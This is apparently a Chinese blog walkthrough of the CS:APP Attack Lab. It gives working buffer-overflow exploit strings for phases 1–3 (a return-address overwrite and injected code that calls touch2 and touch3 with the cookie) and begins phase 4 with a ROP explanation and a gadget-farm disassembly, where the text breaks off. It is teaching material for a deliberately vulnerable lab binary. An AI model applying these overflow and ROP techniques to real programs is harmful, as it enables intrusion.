4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   retq   </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br><span class="line"></span><br><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017c4:c7 05 0e 2d 20 00 01 movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:00 00 00 </span><br><span class="line">  4017ce:bf c5 30 40 00       mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:e8 e8 f4 ff ff       callq  400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  4017dd:e8 ab 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  4017e7:e8 54 f6 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>我将三个涉及到的东西提取了出来. 主要看getbuf和touch1函数.</p><p>对于getbuf来说, 我们看到汇编的第一句就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub $0x28,%rsp</span><br></pre></td></tr></table></figure><p>也就是说, getbuf首先开辟了0x28的stack空间.</p><p>对于touch1来说,我们知道它的地址是:0x4017c0. </p><p>好的,知道这两点,我们就可以写攻击代码了, 在写之前, 先画个示意图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720231159598.png" alt="image-20200720231159598"></p><p>说明:</p><ol><li>单元格中存放的是起始起始,一个内存单元8个字节</li><li>buffer由低到高写入</li></ol><p>关键点是要 <strong>覆盖test 401976</strong>这个单元, 正常情况下,这里存放这从getbuf返回后,test函数中getbuf的下一行汇编指令. 要从test中抢夺函数控制权, 就需要覆盖这里. 那覆盖成什么样? 当然就是我们 touch1函数的首地址了, 另外需要注意机器的字节序(这里是小端序). 综上, 攻击代码如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question1: 填充40个字节后加入touch1的返回地址(小端序) *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 byte *&#x2F;</span><br><span class="line">c0 17 40 00 00 00 00 00 &#x2F;* touch1 address *&#x2F;</span><br></pre></td></tr></table></figure><p>40 = 0x28</p><blockquote><p>请注意, 之所以可以做,因为ctarget在汇编时关闭了 <strong>stack随机和注入代码不可执行</strong> 两个常用的阻止注入攻击的方法, 否则这个题就目前的知识来说是无解的.</p></blockquote><h2 id="2-Phase-2"><a href="#2-Phase-2" class="headerlink" title="2. Phase 2"></a>2. Phase 2</h2><p>题目:</p><p>Phase 2 involves injecting a small amount of code as part of your exploit string. Within the file ctarget there is code for a function touch2 having the following C representation:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>;</span><br><span class="line">     <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.</p><p>题目的意思很简单, 接着题目1, 现在要跳转的函数是touch2, 只不过touch2需要一个参数val, val是cookie的值. 这里就要用到注入了, 如何生成注入代码,请参照 attack lab的write up的Appendix B.</p><p>说明:cookie在lab文件中有, 我这里它是 0x59b997fa.</p><p>关键点:</p><ol><li>cookie值</li><li>rdi寄存器保存函数的第一个参数.</li></ol><p>思路简单:</p><ol><li>设置rdi = cookie value</li><li>跳转到touch2即可.</li></ol><p>但是这里存在两个跳转, 1.跳转我们的注入代码的首地址.2.跳转到touch2. 画个图看看:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200720232843852.png" alt="image-20200720232843852"></p><p>也就是说,我们首先应该跳转到我们注入的代码的首地址, 然后注入代码执行过程中(红色的区域的某个部分),又跳转到touch2. </p><p>跳转1很直观, 我们覆盖了原来的地址, 那跳转2如何实现?</p><p>这个就要理解清除call和ret指令的工作了, 简单说来:</p><ol><li>call, %rsp-1, push当前执行指令的指令到%rsp所指的内存空间, 设置%rip为要跳转的函数的第一条指令地址.</li><li>ret, pop %rsp指向的内存空间的内容到 %rip, %rsp+1.</li></ol><p>于是要实现跳转2, 我们只用push touch2的第一条指令的地址到$%rsp, %rsp-1即可. 其实也就一条命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push touch2_address</span><br></pre></td></tr></table></figure><p>至于设置%rdi=cooike, 那就很直接了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cookie_value, %rdi</span><br></pre></td></tr></table></figure><p>结合两条指令, 写出汇编代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov cookie_value, %rdi</span><br><span class="line">push touch2_address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>更换为实际value, 并用objdump反汇编,最终可得答案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question2: *&#x2F;</span><br><span class="line">48 c7 c7 fa 97 b9 59 &#x2F;* mov $0x59b997fa      %rdi 设置cooike *&#x2F;</span><br><span class="line">68 ec 17 40 00       &#x2F;* pushq  $0x4017ec     push touch2的地址 *&#x2F;</span><br><span class="line">c3                   &#x2F;* ret                  返回 *&#x2F;</span><br><span class="line">&#x2F;* 上面一共13个字节, buf一共40个字节所以需要填充 40-13&#x3D;27个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00                &#x2F;* 3 bytes *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;* exploit string code 的开始地址（即get buf的栈地地址) *&#x2F;</span><br></pre></td></tr></table></figure><p>一点题外话:</p><blockquote><p>这个题思路很简单,但是我却做了差不多3个小时. 原因在于, 我对每个指令都补齐成了8个字节(也不知道脑袋怎么想的). 搞了1,2个小时 , gdb调试出来的指令和我写入的指令就是不同, 无奈取网上查答案, 发现思路是对的, 别人的代码却和我的不同, 要不就是 题目都和我不一样. 最后认真看了一个帖子才找到自己的问题. </p><p>比如我将 c3指令,编码成了 c3 00 00 00 00 00 00 00 . 所以在运行时, 总是不对.</p></blockquote><h2 id="3-Phase-3"><a href="#3-Phase-3" class="headerlink" title="3. Phase 3"></a>3. Phase 3</h2><p>题目:</p><p>Phase 3 also involves a code injection attack, but passing a string as argument. Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">     <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">     <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">     <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     vlevel = <span class="number">3</span>;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Part of validation protocol */</span></span><br><span class="line">     <span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Touch3!:</span></span><br><span class="line"><span class="string">         You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">         validate(<span class="number">3</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Misfire:</span></span><br><span class="line"><span class="string">         You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">         fail(<span class="number">3</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must make it appear to touch3 as if you have passed a string representation of your cookie as its argument.</p><p>这个题目的几个关键点:</p><ol><li>cooike的 string ascii码表示</li><li>cooike的string ascii码的存放以及 <strong>存放位置的确定</strong></li><li>rdi指向 string 的存放地址.</li><li>touch3跳转</li></ol><p>cooike的ascii码很简单, 对照ascii码表即可得:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* 9 bytes *&#x2F; </span><br></pre></td></tr></table></figure><p>唯一值得注意的是, 要在末尾添加\0表示c 字符串的结束.</p><p>难点在于确定位置: 说说我做的时候遇到的问题:</p><p>之所以难以确定字符串存放的位置, 是因为后续的hexmatch和stringncmp函数会覆盖buf的stack空间.</p><ul><li><p>我最初想的是, 将字符串存放在一个相对很低的位置, 让后续的两个函数不会产生覆盖. 但是这样的问题是, cooike string无法进行硬编码. 毕竟没有指令可以直接写字符串到内存中, 倒是可以一个个字符的写入, 但是这样我们的exploit string会过长, 于是这个方法废弃了.</p></li><li><p>说第二想法之前, 我们先看看后续的程序会对stack空间做些什么:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090502836.png" alt="image-20200721090502836"></p><p>那字符串到底放在哪里? 我尝试了将字符串放在了buf的stack顶端和低端, 如下两图:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721090628772.png" alt="image-20200721090628772"></p><p>经过gdb调试,两者都会被覆盖, 所以这个方案也被pass掉了.</p><p>继续思考, 放在内存的低端的确很容易被覆盖,因为hexmatch函数中有个随机从某个位置开始写入cbuf的操作, 所以低端是没法用的. 只能考虑高端, 高端是由 push压入regs导致的覆盖, 只要避免了这个就好了. 回忆以下push指令是如何工作的, </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push reg</span><br></pre></td></tr></table></figure><p>reg被压入%rsp当前指向的内存空间, 然后%rsp-1</p><p>所以我们可以直接继续覆盖, 看示意图:</p></li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/5f16832c14195aa594b36a03.png" alt="image-20200721091909441"></p><p>可以得到注入代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* question3: *&#x2F;</span><br><span class="line">48 c7 c7 a8 dc 61 55 &#x2F;* mov $0x5561dca8,%rdi 设置$rdi指向string内存地址 *&#x2F;</span><br><span class="line">68 fa 18 40 00       &#x2F;* pushq  $0x4018fa     push touch3的地址 *&#x2F;</span><br><span class="line">c3                   &#x2F;* ret                  返回 *&#x2F;</span><br><span class="line">&#x2F;* 上面一共13个字节, buf一共40个字节所以需要填充 40-13&#x3D;27个字节 *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 8 bytes *&#x2F;</span><br><span class="line">00 00 00                &#x2F;* 3 bytes *&#x2F;</span><br><span class="line">78 dc 61 55 00 00 00 00 &#x2F;* exploit string code 的开始地址（即get buf的栈地地址) *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 00 &#x2F;* 继续覆盖为cookie string *&#x2F;</span><br></pre></td></tr></table></figure><h2 id="4-Phase-4"><a href="#4-Phase-4" class="headerlink" title="4. Phase 4"></a>4. Phase 4</h2><p>从这个阶段开始, 就是aop攻击的内容了. 所以在继续之前, 一定要知道rop攻击的理论基础. </p><p>rop的背景是 在stack随机和注入不可能执行 等防止注入攻击手段下, 我们可以寻找text section中有效的代码片段, 这些片段通常都是以ret结尾, 找到这些指令后(一个这样的片段被称为一个gaddget), 通过stack frame入栈出栈原理,将这些gaddget串成一条链, 从而能够组成有用的攻击代码.</p><p>本题的背景是开启了 stack随机化和注入注入代码不可执行 两个功能的.</p><p>好,现在来看看phase4题目:</p><p>For Phase 4, you will repeat the attack of Phase 2, but do so on program RTARGET using gadgets from your gadget farm. You can construct your solution using gadgets consisting of the following instruction types, and using only the first eight x86-64 registers (%rax–%rdi).<br>movq : The codes for these are shown in Figure 3A.<br>popq : The codes for these are shown in Figure 3B.<br>ret : This instruction is encoded by the single byte 0xc3.<br>nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single<br>byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093742135.png" alt="image-20200721093742135"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200721093753166.png" alt="image-20200721093753166"></p><p>所有可用指令, 我都高亮了.</p><p>注意点:</p><p>题目中提到的gadget farm是指在rtaget反汇编后, 我们的gaddget只能从start_farm段到end_farm段之间的所有指令中抽取. 这之间的指令为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  401999:c3                   retq   </span><br><span class="line"></span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:b8 fb 78 90 90       mov    $0x909078fb,%eax</span><br><span class="line">  40199f:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:8d 87 48 89 c7 c3    lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:8d 87 51 73 58 90    lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:c7 07 48 89 c7 c7    movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019b5 &lt;setval_424&gt;:</span><br><span class="line">  4019b5:c7 07 54 c2 58 92    movl   $0x9258c254,(%rdi)</span><br><span class="line">  4019bb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019bc &lt;setval_470&gt;:</span><br><span class="line">  4019bc:c7 07 63 48 8d c7    movl   $0xc78d4863,(%rdi)</span><br><span class="line">  4019c2:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:c7 07 48 89 c7 90    movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:b8 29 58 90 c3       mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d0 &lt;mid_farm&gt;:</span><br><span class="line">  4019d0:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4019d5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:48 8d 04 37          lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:b8 5c 89 c2 90       mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e1 &lt;setval_296&gt;:</span><br><span class="line">  4019e1:c7 07 99 d1 90 90    movl   $0x9090d199,(%rdi)</span><br><span class="line">  4019e7:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:8d 87 89 ce 78 c9    lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019ef &lt;addval_490&gt;:</span><br><span class="line">  4019ef:8d 87 8d d1 20 db    lea    -0x24df2e73(%rdi),%eax</span><br><span class="line">  4019f5:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019f6 &lt;getval_226&gt;:</span><br><span class="line">  4019f6:b8 89 d1 48 c0       mov    $0xc048d189,%eax</span><br><span class="line">  4019fb:c3                   retq   </span><br><span class="line"></span><br><span class="line">00000000004019fc &lt;setval_384&gt;:</span><br><span class="line">  4019fc:c7 07 81 d1 84 c0    movl   $0xc084d181,(%rdi)</span><br><span class="line">  401a02:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:8d 87 41 48 89 e0    lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a0a &lt;setval_276&gt;:</span><br><span class="line">  401a0a:c7 07 88 c2 08 c9    movl   $0xc908c288,(%rdi)</span><br><span class="line">  401a10:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:8d 87 89 ce 90 90    lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a18 &lt;getval_345&gt;:</span><br><span class="line">  401a18:b8 48 89 e0 c1       mov    $0xc1e08948,%eax</span><br><span class="line">  401a1d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a1e &lt;addval_479&gt;:</span><br><span class="line">  401a1e:8d 87 89 c2 00 c9    lea    -0x36ff3d77(%rdi),%eax</span><br><span class="line">  401a24:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a25 &lt;addval_187&gt;:</span><br><span class="line">  401a25:8d 87 89 ce 38 c0    lea    -0x3fc73177(%rdi),%eax</span><br><span class="line">  401a2b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a2c &lt;setval_248&gt;:</span><br><span class="line">  401a2c:c7 07 81 ce 08 db    movl   $0xdb08ce81,(%rdi)</span><br><span class="line">  401a32:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:b8 89 d1 38 c9       mov    $0xc938d189,%eax</span><br><span class="line">  401a38:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a39 &lt;addval_110&gt;:</span><br><span class="line">  401a39:8d 87 c8 89 e0 c3    lea    -0x3c1f7638(%rdi),%eax</span><br><span class="line">  401a3f:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a40 &lt;addval_487&gt;:</span><br><span class="line">  401a40:8d 87 89 c2 84 c0    lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">  401a46:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a47 &lt;addval_201&gt;:</span><br><span class="line">  401a47:8d 87 48 89 e0 c7    lea    -0x381f76b8(%rdi),%eax</span><br><span class="line">  401a4d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a4e &lt;getval_272&gt;:</span><br><span class="line">  401a4e:b8 99 d1 08 d2       mov    $0xd208d199,%eax</span><br><span class="line">  401a53:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a54 &lt;getval_155&gt;:</span><br><span class="line">  401a54:b8 89 c2 c4 c9       mov    $0xc9c4c289,%eax</span><br><span class="line">  401a59:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a5a &lt;setval_299&gt;:</span><br><span class="line">  401a5a:c7 07 48 89 e0 91    movl   $0x91e08948,(%rdi)</span><br><span class="line">  401a60:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a61 &lt;addval_404&gt;:</span><br><span class="line">  401a61:8d 87 89 ce 92 c3    lea    -0x3c6d3177(%rdi),%eax</span><br><span class="line">  401a67:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:b8 89 d1 08 db       mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a6e &lt;setval_167&gt;:</span><br><span class="line">  401a6e:c7 07 89 d1 91 c3    movl   $0xc391d189,(%rdi)</span><br><span class="line">  401a74:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a75 &lt;setval_328&gt;:</span><br><span class="line">  401a75:c7 07 81 c2 38 d2    movl   $0xd238c281,(%rdi)</span><br><span class="line">  401a7b:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a7c &lt;setval_450&gt;:</span><br><span class="line">  401a7c:c7 07 09 ce 08 c9    movl   $0xc908ce09,(%rdi)</span><br><span class="line">  401a82:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a83 &lt;addval_358&gt;:</span><br><span class="line">  401a83:8d 87 08 89 e0 90    lea    -0x6f1f76f8(%rdi),%eax</span><br><span class="line">  401a89:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a8a &lt;addval_124&gt;:</span><br><span class="line">  401a8a:8d 87 89 c2 c7 3c    lea    0x3cc7c289(%rdi),%eax</span><br><span class="line">  401a90:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a91 &lt;getval_169&gt;:</span><br><span class="line">  401a91:b8 88 ce 20 c0       mov    $0xc020ce88,%eax</span><br><span class="line">  401a96:c3                   retq   </span><br><span class="line"></span><br><span class="line">0000000000401a97 &lt;setval_181&gt;:</span><br><span class="line">  401a97:c7 07 48 89 e0 c2    movl   $0xc2e08948,(%rdi)</span><br><span class="line">  401a9d:c3                   retq   </span><br><span class="line"></span><br><span 